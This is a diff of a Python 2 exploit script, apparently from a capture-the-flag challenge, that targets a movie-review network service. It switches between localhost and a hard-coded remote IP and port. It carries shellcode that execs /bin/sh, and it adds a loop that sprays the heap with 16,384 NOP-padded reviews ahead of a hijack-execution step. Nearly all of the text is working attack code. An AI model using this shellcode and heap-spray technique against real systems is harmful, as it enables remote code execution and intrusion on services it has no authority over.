@@ -12,9 +12,22 @@ import time
 #
 ###############################################################################
 
-HOST = "localhost"
-PORT = "55000"
-NOP  = "\x90"
+LOCAL = True
+
+if LOCAL:
+    HOST = "localhost"
+    PORT = "55000"
+    SLEEP_TIME = .05
+else:
+    HOST = "54.215.5.83"
+    PORT = "3036"
+    SLEEP_TIME = .5
+
+NOP = "\x90"
+
+HEAP_ADDRESS = "0x90000000"
+MAX_ENTRIES = 16384
+
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -124,7 +137,7 @@ def review_movie(title, review, con):
     con.send_line("r")
     
     # Wait for a response
-    time.sleep(1)
+    time.sleep(SLEEP_TIME)
 
     # Clear out the read buffer
     con.read_one(0)
@@ -133,23 +146,23 @@ def review_movie(title, review, con):
     con.send_line(title)
 
     # Wait for a response
-    time.sleep(1)
+    time.sleep(SLEEP_TIME)
 
     # Clear out the read buffer
     con.read_one(0)
 
-    pause_script_msg("Press Enter to send review")
+    #pause_script_msg("Press Enter to send review")
 
     # Send the review
     con.send_line(review)
 
     # Wait for a response
-    time.sleep(1)
+    time.sleep(SLEEP_TIME)
 
     # Read the response
     resp = con.read_line()
 
-    print "Response received: " + resp
+    #print "Response received: " + resp
     # Did we delete the movie?
     return "Reviewed!" in resp
 
@@ -355,7 +368,7 @@ send_movie(movie, con)
 send_movie(hacker, con)
 
 print "Movie sent"
-pause_script_msg("Press Enter to start reviews")
+#pause_script_msg("Press Enter to start reviews")
 
 #go_interactive(con)
 
@@ -364,10 +377,11 @@ pause_script_msg("Press Enter to start reviews")
 title  = NOP + "\0"
 review = build_nop_string(3)
 
-if review_movie(title, review, con):
-    print "Review Successful!\n"
-else:
-    print "Review Failed!\n"
+for i in range(0, MAX_ENTRIES):
+    if review_movie(title, review, con):
+        print `i` + ": Review Successful!"
+    else:
+        print `i` + ": Review Failed!"
 
 #hijack_execution(con)
 
